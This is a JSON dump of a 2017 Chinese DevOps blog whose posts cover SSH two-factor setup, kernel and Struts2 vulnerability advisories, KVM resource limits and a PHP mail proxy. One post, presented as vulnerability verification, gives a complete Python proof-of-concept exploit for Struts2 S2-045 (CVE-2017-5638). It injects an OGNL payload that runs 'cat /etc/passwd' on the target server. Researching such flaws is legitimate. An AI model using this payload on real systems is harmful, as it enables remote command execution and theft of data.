{"meta":{"title":"Netb2c's Blog","subtitle":"We'd better struggle for the future rather than regret for the past.","description":"Life & Work Essays.","author":"Netb2c","url":"http://blog.unixmen.cn"},"pages":[{"title":"","date":"2017-03-03T06:54:20.000Z","updated":"2017-03-03T06:54:20.000Z","comments":true,"path":"404.html","permalink":"http://blog.unixmen.cn/404.html","excerpt":"","text":"","raw":null,"content":null},{"title":"About","date":"2017-02-15T08:36:30.000Z","updated":"2017-03-06T06:54:49.000Z","comments":true,"path":"about/index.html","permalink":"http://blog.unixmen.cn/about/index.html","excerpt":"","text":"Netb2c Nickname: netb2c Position: DevOps Email: netb2c(a)linux.cn Blog: http://blog.unixmen.cn Github:netb2c","raw":null,"content":null},{"title":"第一篇博客","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T03:47:05.000Z","comments":true,"path":"第一篇博客/index.html","permalink":"http://blog.unixmen.cn/第一篇博客/index.html","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null},{"title":"","date":"2017-03-29T01:10:29.000Z","updated":"2017-03-15T05:03:34.000Z","comments":true,"path":"google0d8bd60c9b676916.html","permalink":"http://blog.unixmen.cn/google0d8bd60c9b676916.html","excerpt":"","text":"google-site-verification: google0d8bd60c9b676916.html","raw":null,"content":null}],"posts":[{"title":"通过运维密码实现Linux系统SSH双因子认证","slug":"通过运维密码实现Linux系统SSH双因子认证","date":"2017-03-29T00:38:24.000Z","updated":"2017-03-29T01:09:13.000Z","comments":true,"path":"2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","excerpt":"","text":"#SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证 ##关于本文 本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”Google Authenticator“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。 ##前言/背景 近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。 双因子认证 什么是双因子认证 双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。 在这种多重认证的系统中，用户需要通过两种不同的认证程序： 提供他们知道的信息（如 用户名/密码） 再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码） ##SSH双因子认证实现思路 使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。 关于Google 身份验证器 为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器Google Authenticator，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。 关于运维密码 Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。 ##如何开始 首先我们需要一些准备工作： 一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机 一台能运行微信的智能手机 一台支持SSH登陆的终端 ##在 Linux 系统中安装 Google 身份验证器 第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。 用安装包安装 Google 身份验证器如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。 在 Ubuntu 上安装 Google 身份验证器： 12sudo apt-get install libpam-google-authenticator 在 Fedora 上安装 Google 身份验证器： 12sudo dnf install google-authenticator 在 CentOS 上安装 Google 身份验证器： 在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令： 12sudo yum install google-authenticator 编译安装 Google 身份验证器首先，安装构建 Google 身份验证器所需的软件包。 在 Debian、 Ubuntu 或 Linux Mint 上： 12sudo apt-get install wget make gcc libpam0g-dev 在 CentOS、 Fedora 或 RHEL上： 12sudo yum install wget make gcc pam-devel 然后下载 Google 身份验证器的源代码 12git clone https://github.com/google/google-authenticator.git 编译安装Google 身份验证器： 12345678cd google-authenticator/libpam./bootstrap.sh./configuremake 如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。 最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示： 12sudo make install 至此，Google 身份验证器安装完成。 配置Google 身份验证器及运维密码完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。 配置google-authenticator及生成验证密钥 使用（以下）命令生成验证密钥 12google-authenticator 生成验证密钥的时候，会再次确认信息。 12Do you want authentication tokens to be time-based (y/n) 意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y 输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。 保存Google Authenticator配置文件 Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存： 意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？ 12Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n) 输入y回车 禁止同一令牌多用途登陆 意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。 123456 Do you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it increasesyour chances to notice or even prevent man-in-the-middle attacks (y/n) 输入y回车 时间容错设置 意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。 1234567891011121314 By default, tokens are good for 30 seconds. In order to compensate forpossible time-skew between the client and the server, we allow an extratoken before and after the current time. If you experience problems withpoor time synchronization, you can increase the window from its defaultsize of +-1min (window size of 3) to about +-4min (window size of17 acceptable tokens).Do you want to do so? (y/n) 这个可根据实际情况进行配置。 暴力破解防护 意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。 12345678 If the computer that you are logging into isn&apos;t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting (y/n) 输入y回车 配置完成 配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示： 配置运维密码 打开微信小程序 打开微信，依次点击发现，小程序 输入“运维密码”并搜索 点击“运维密码”进入应用 点击右下角二维码图标 扫一扫配置google-authenticator时所生成的二维码 点击确定添加场景 添加完成 配置SSH服务 添加认证模块 在/etc/pam.d/sshd文件添加认证模块 12echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd 配置任何的密码认证 12sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config 重启sshd服务 12systemctl restart sshd.service 测试登陆以上配置完成基本上就搞定了，下面我们进行测试。 登陆测试 输入命令登陆主机 12ssh root@10.112.2.3 首先输入服务器的密码,接着会让输入运维密码。 运维密码可在小程序中查看。 如下图： 我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。 公钥登陆测试 如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证： 首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 12ssh-copy-id root@10.112.2.3 登陆测试 我们可以看到，不需要输入任何密码，直接登陆到了系统。 结合运维密码配置增强型SSH安全选项针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？ 配置SSH公钥双因子 修改/etc/ssh/sshd_config配置文件 12echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config 重启SSH服务 12systemctl restart sshd.service 登陆测试 12ssh root@10.112.2.3 可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。 没有密钥的情况下尝试登陆测试,如下图 至此，本文结束，如有错误及不足欢迎指正。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"安全","slug":"技术文档/Tools/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/安全/"}],"tags":[{"name":"双因子认证","slug":"双因子认证","permalink":"http://blog.unixmen.cn/tags/双因子认证/"},{"name":"SSH安全加固","slug":"SSH安全加固","permalink":"http://blog.unixmen.cn/tags/SSH安全加固/"},{"name":"运维密码","slug":"运维密码","permalink":"http://blog.unixmen.cn/tags/运维密码/"}]},{"title":"潜伏7年的Linux内核漏洞CVE-2017-2636 ,可本地提权","slug":"潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权","date":"2017-03-20T02:00:55.000Z","updated":"2017-03-20T02:55:33.000Z","comments":true,"path":"2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","link":"","permalink":"http://blog.unixmen.cn/2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","excerpt":"","text":"漏洞描述又一个古老的Linux内核漏洞被曝光！ 漏洞编号：CVE-2017-2636漏洞发现者：Alexander Popov漏洞危害：高危，(CVSS v3标准漏洞,评分为7.8), 低权限用户利用该漏洞可以在Linux系统上实现本地提权。影响范围：这个bug最早引入在2009年6月22号。在该日期发布后的内核版本均可能受该漏洞影响。详情请参看https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8 漏洞简述：该漏洞是Linux内核驱动 n_hdlc 模块(drivers/tty/n_hdlc.c)发生条件竞争导致的，。 Positive Technologies的研究员Alexander Popov发现了存在于N_HLDC linux内核驱动的竞争条件问题。这个内核驱动负责处理高级数据链路控制（High-Level Data Link Control或简称HDLC）数据。问题导致了double-free漏洞。利用该漏洞可以进行权限提升。该驱动模块提供HDLC串行线路规则，在大多Linux发行版的内核配置为CONFIG_N_HDLC = m，n_hdlc被编译成模块并启用。 Double Free其实就是同一个指针free两次。虽然一般把它叫做double free，其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。 “这是CVE-2017-2636的声明，该漏洞即N_HLDC (drivers/tty/n_hdlc.c) linux内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList的安全公告提到。“该驱动提供HDLC串行线路规程，这是很多linux发行版中的内核模块——只要是内核设置中有CONFIG_N_HDLC=m的linux发行版。要利用这个漏洞不需要Microgate或者SyncLink硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。” 因此未经授权的攻击者可以利用这个漏洞注入执行任意代码。 影响范围 这个漏洞影响的范围涵盖大多数主流的Linux发行版，包括Red Hat Enterprise Linux 6, 7, Fedora, SUSE, Debian和Ubuntu。 由于漏洞可以追溯至2009年7月，那些Linux设备存在漏洞长达7年了，但是根据Positive Technologies的调查，很难确定漏洞是否已经被利用过。 “漏洞非常老，所以在Linux工作站和服务器中传播广泛。”Popov说道，“要想利用漏洞，攻击者只需要没有权限的普通用户就行了。另外，攻击不需要任何特殊的硬件。” 研究人员在用syzkaller fuzzer进行系统调用测试的时候发现了这个漏洞。syzkaller fuzzer是由Google开发的代码安全审计软件。 Popov于是在2017年2月28日将漏洞细节、exp原型和补丁上报给了kernel.org。Popov称会在之后公布PoC。 修复建议 该漏洞目前已经修复，更新和漏洞详情均在3月7日公布。建议用户尽快下载安全更新。如果暂时无法安装更新，建议手动关闭n_hdlc模块。 Linux各发行版本对于该漏洞相关信息Red Hat Enterprise Linux/CentOShttps://access.redhat.com/security/cve/CVE-2017-2636 Debianhttps://security-tracker.debian.org/tracker/CVE-2017-2636 ubuntuhttps://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html SUSE/openSUSEhttps://www.suse.com/security/cve/CVE-2017-2636.html","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"KVM 实例资源限制","slug":"KVM实例资源限制","date":"2017-03-08T10:32:46.000Z","updated":"2017-03-08T10:35:56.000Z","comments":true,"path":"2017/03/08/KVM实例资源限制/","link":"","permalink":"http://blog.unixmen.cn/2017/03/08/KVM实例资源限制/","excerpt":"","text":"KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。以下分享如何控制实例的资源使用，对实例使用资源进行控制。 一、磁盘资源的控制对磁盘的资源限制可使用blkiotune来实现。 使用blkiotune对磁盘进行限制有两种方式： 设置实例的权重 限制磁盘的IOPS 命令行格式：1blkiotune &lt;domain&gt; [--weight &lt;number&gt;] [--device-weights &lt;string&gt;] [--device-read-iops-sec &lt;string&gt;] [--device-write-iops-sec &lt;string&gt;] [--device-read-bytes-sec &lt;string&gt;] [--device-write-bytes-sec &lt;string&gt;] [--config] [--live] [--current] 参数如下：123456789--total-bytes-sec &lt;number&gt; total throughput limit in bytes per second--read-bytes-sec &lt;number&gt; read throughput limit in bytes per second--write-bytes-sec &lt;number&gt; write throughput limit in bytes per second--total-iops-sec &lt;number&gt; total I/O operations limit per second--read-iops-sec &lt;number&gt; read I/O operations limit per second--write-iops-sec &lt;number&gt; write I/O operations limit per second--config affect next boot--live affect running domain--current affect current domain 设置磁盘的权重磁盘的权重数值范围在100-1000。 示例：设置虚拟机的权重为700，并立即生效。1virsh blkiotune 25 --weight 700 --live 实例xml配置为：123&lt;blkiotune&gt;&lt;weight&gt;700&lt;/weight&gt;&lt;/blkiotune&gt; 限制磁盘IOPS使用blkdeviotune限制读写速度和IOPS 示例：限制读写（吞吐量）及IOPS1virsh blkdeviotune netb2c vda --read-bytes-sec 4096 --write-bytes-sec 2048 --read-iops-sec 15 --write-iops-sec 15 --live 实例xml配置为： 123456&lt;iotune&gt; &lt;read_bytes_sec&gt;4096&lt;/read_bytes_sec&gt; &lt;write_bytes_sec&gt;2048&lt;/write_bytes_sec&gt; &lt;read_iops_sec&gt;15&lt;/read_iops_sec&gt; &lt;write_iops_sec&gt;15&lt;/write_iops_sec&gt;&lt;/iotune&gt; 实测结果读写总和（读写速度、IOPS）与读写（读写速度、IOPS）同时只能设置一个 列举guest块设备列表 12virsh domblklist wpftestvda /home1/wpf/ubuntu-14-04-test.qcow2 设定guest读/写IOPS 1virsh blkdeviotune wpftest vda --read-iops-sec 300 --write-iops-sec 300 获取当前IOPS限制 1234567virsh blkdeviotune wpftest vdatotal_bytes_sec: 0read_bytes_sec : 0write_bytes_sec: 0total_iops_sec : 0read_iops_sec : 300write_iops_sec : 300 二、网卡的资源控制网卡的资源限制可在添加网卡是进行限制，以及对已有的网卡进行限制两种资源限制效果上没有区别，可按需选择。 添加网卡时对网卡带宽进行限制命令行格式为：1attach-interface &lt;domain&gt; &lt;type&gt; &lt;source&gt; [&lt;target&gt;] [&lt;mac&gt;] [&lt;script&gt;] [&lt;model&gt;] [--persistent] [&lt;inbound&gt;] [&lt;outbound&gt;] 命令行参数：12345678910[--domain] &lt;string&gt; domain name, id or uuid[--type] &lt;string&gt; network interface type[--source] &lt;string&gt; source of network interface[--target] &lt;string&gt; target network name[--mac] &lt;string&gt; MAC address[--script] &lt;string&gt; script used to bridge network interface[--model] &lt;string&gt; model type--persistent persist interface attachment[--inbound] &lt;string&gt; control domain&apos;s incoming traffics[--outbound] &lt;string&gt; control domain&apos;s outgoing traffics 对已有网卡进行带宽限制 命令格式为： 1domiftune &lt;domain&gt; &lt;interface&gt; [--inbound &lt;string&gt;] [--outbound &lt;string&gt;] [--config] [--live] [--current] 参数为： 1234567[--domain] &lt;string&gt; domain name, id or uuid[--interface] &lt;string&gt; interface device (MAC Address)--inbound &lt;string&gt; control domain&apos;s incoming traffics--outbound &lt;string&gt; control domain&apos;s outgoing traffics--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 1234&lt;bandwidth&gt;&lt;inbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;outbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;/bandwidth&gt; 注：单位kilobytes 实测结果Libvirt实际也是使用TC，因为TC只能限制流出方向流量，不能限制流入方向，所以通过Libvirt限制流量，实际也只能限制流出方向。 列举guest网卡列表： 1234virsh domiflist netb2cInterface Type Source Model MAC-------------------------------------------------------vnet44 network default rtl8139 52:54:00:4a:61:6a 设定带宽限制 1virsh domiftune wpftest 52:54:00:3b:e2:a5 --inbound 1000 --outbound 1000 --live 查看当前网卡带宽限制 1234567virsh domiftune netb2c vnet44inbound.average: 1000inbound.peak : 0inbound.burst : 0outbound.average: 1000outbound.peak : 0outbound.burst : 0 注：资源限制过程中，–interface可以是MAC地址也可以是设备名字，生产环境最好使用MAC地址进行限制。 三、CPU资源的控制对于CPU的资源控制可对实例CPU的权重进行调整，优化可对vcpu与cpu物理核心进行绑定已提升性能及减少宿主机的CPU压力。 命令行格式：1schedinfo &lt;domain&gt; [--weight &lt;number&gt;] [--cap &lt;number&gt;] [--current] [--config] [--live] [[--set] &lt;string&gt;].. 参数：1234567[--domain] &lt;string&gt; domain name, id or uuid--weight &lt;number&gt; weight for XEN_CREDIT--cap &lt;number&gt; cap for XEN_CREDIT--current get/set current scheduler info--config get/set value to be used on next boot--live get/set value from running domain[--set] &lt;string&gt; parameter=value 实例xml配置为1234567891011121314&lt;domain&gt;&lt;cputune&gt;&lt;vcpupin vcpu=&quot;0&quot; cpuset=&quot;1-4,^2&quot;/&gt;&lt;vcpupin vcpu=&quot;1&quot; cpuset=&quot;0,1&quot;/&gt;&lt;vcpupin vcpu=&quot;2&quot; cpuset=&quot;2,3&quot;/&gt;&lt;vcpupin vcpu=&quot;3&quot; cpuset=&quot;0,4&quot;/&gt;&lt;emulatorpin cpuset=&quot;1-3&quot;/&gt;&lt;shares&gt;2048&lt;/shares&gt;&lt;period&gt;1000000&lt;/period&gt;&lt;quota&gt;-1&lt;/quota&gt;&lt;emulator_period&gt;1000000&lt;/emulator_period&gt;&lt;emulator_quota&gt;-1&lt;/emulator_quota&gt;&lt;/cputune&gt;&lt;/domain&gt; 主要参数说明：shares cpu权重，没有固定的数值，和其他的虚拟机相比较，那个的数值大，那个可以使用的cpu资源就多，比如设置2048值得虚拟机，就比设置1024数值的虚拟机可以多使用2倍的cpu资源。period vcpu强制间隔的时间周期，单位微秒，范围[1000, 1000000]，每一个vcpu不能使用超过period时间周期。quota vcpu最大允许带宽，单位微秒，范围[1000, 18446744073709551]emulator_period 强制间隔的时间周期，单位微妙，范围[1000, 1000000]，虚拟机进程(qemu)不能使用超过period时间周期。emulator_quota 虚拟机进程(qemu)最大允许带宽，单位微妙，范围[1000, 18446744073709551]。 实测结果对vcpu绑定有性能提升的效果，设置权重能控制CPU的资源利用。123virsh schedinfo --set cpu_shares=500 netb2cScheduler : posixcpu_shares : 500 四、内存资源的控制使用memtune可对实例使用内存资源进行控制 命令行格式为： 1memtune &lt;domain&gt; [--hard-limit &lt;number&gt;] [--soft-limit &lt;number&gt;] [--swap-hard-limit &lt;number&gt;] [--min-guarantee &lt;number&gt;] [--config] [--live] [--current] 命令行参数： 12345678[--domain] &lt;string&gt; domain name, id or uuid--hard-limit &lt;number&gt; Max memory, as scaled integer (default KiB)--soft-limit &lt;number&gt; Memory during contention, as scaled integer (default KiB)--swap-hard-limit &lt;number&gt; Max memory plus swap, as scaled integer (default KiB)--min-guarantee &lt;number&gt; Min guaranteed memory, as scaled integer (default KiB)--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 12345678&lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt;&lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt;&lt;memtune&gt;&lt;hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/hard_limit&gt;&lt;soft_limit unit=&apos;KiB&apos;&gt;8388608&lt;/soft_limit&gt;&lt;min_guarantee unit=&apos;Kib&apos;&gt;1024000&lt;/min_guarantee&gt;&gt;&lt;swap_hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/swap_hard_limit&gt;&lt;/memtune&gt; 实测结果内存可以限制住，但一旦实例内存超限，会导致实例内存溢出从而宕机。 示例： 1virsh memtune netb2c --hard-limit 4194304 --soft-limit 8388608 --swap-hard-limit 4194304 --live --config 查看限制结果 1234virsh memtune netb2chard_limit : 4194304soft_limit : 8388608swap_hard_limit: 4194304","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"虚拟化","slug":"技术文档/Tools/虚拟化","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/"},{"name":"KVM","slug":"技术文档/Tools/虚拟化/KVM","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/KVM/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.unixmen.cn/tags/KVM/"},{"name":"资源限制","slug":"资源限制","permalink":"http://blog.unixmen.cn/tags/资源限制/"},{"name":"性能优化","slug":"性能优化","permalink":"http://blog.unixmen.cn/tags/性能优化/"}]},{"title":"Struts-045 漏洞验证","slug":"Struts-045-漏洞验证","date":"2017-03-07T08:20:18.000Z","updated":"2017-03-08T01:18:35.000Z","comments":true,"path":"2017/03/07/Struts-045-漏洞验证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/","excerpt":"","text":"Struts-045-漏洞验证及漏洞修复后测试 接上篇注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。 一、脚本信息1234567891011121314151617181920#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(): register_openers() datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;) header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read()poc() 二、使用帮助 将脚本命名为st-045.py 在工作目录创建 image1 和 tmp.txt两个空文件 执行 python st-045.py URL如下图所示：三、漏洞修复后","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"关于Apache Struts2（S2-045）漏洞情况的通报","slug":"关于Apache-Struts2（S2-045）漏洞情况的通报","date":"2017-03-07T07:28:49.000Z","updated":"2017-03-07T07:52:55.000Z","comments":true,"path":"2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","excerpt":"","text":"关于Apache Struts2 （S2-045）远程代码执行漏洞通报近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（CNNVD-201703-152）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下： 一、 漏洞简介Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。 ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。 二、 漏洞危害攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。 三、 修复措施目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。 自查方式 用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。 升级修复 受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。 临时缓解 如用户不方便升级，可采取如下临时解决方案： 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。 相关链接官方Aapache Struts2（S2-045）安全公告","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"广告拦截APP\"AdClear\" for 安卓/iOS","slug":"广告拦截APPADclear-for-安卓-iOS","date":"2017-03-06T01:04:36.000Z","updated":"2017-03-06T06:54:33.000Z","comments":true,"path":"2017/03/06/广告拦截APPADclear-for-安卓-iOS/","link":"","permalink":"http://blog.unixmen.cn/2017/03/06/广告拦截APPADclear-for-安卓-iOS/","excerpt":"","text":"良心广告拦截APP分享：乐网AdClear，视频APP无需会员过滤广告 支持手机、平板 支持安卓、iOS 拦截系统内置广告 拦截视频软件广告 自身无广告 本地代理，建立VPN 无需root AppStore及安卓市场都可以搜到 从此观看视频一路畅通无阻。Enjoy it！","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"手机APP","slug":"手机APP","permalink":"http://blog.unixmen.cn/tags/手机APP/"},{"name":"工具","slug":"工具","permalink":"http://blog.unixmen.cn/tags/工具/"},{"name":"广告拦截","slug":"广告拦截","permalink":"http://blog.unixmen.cn/tags/广告拦截/"}]},{"title":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","slug":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","date":"2017-03-03T03:53:41.000Z","updated":"2017-03-06T06:52:44.000Z","comments":true,"path":"2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","link":"","permalink":"http://blog.unixmen.cn/2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","excerpt":"","text":"想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段PHP代码即可。 由于一直用腾讯微信、QQ，所以就用了腾讯免费企业邮局，通过搜索了解到景安提供的有免费虚拟主机，所以就选择他了，，，， 准备工作： 一个域名 已开通腾讯企业邮箱并设置正确解析 一个支持PHP的景安（免费）虚拟主机或者VPS 一、创建代码复制下面的代码，另存为index.php文件 1234&lt;?php $mail = file_get_contents(&quot;http://tel.exmail.qq.com/domain/mail.unixmen.cn&quot;); echo $mail;?&gt; 其中： unixmen.cn 为开通腾讯企业邮箱时所用域名(请改为自己的顶级域名) mail.unixmen.cn 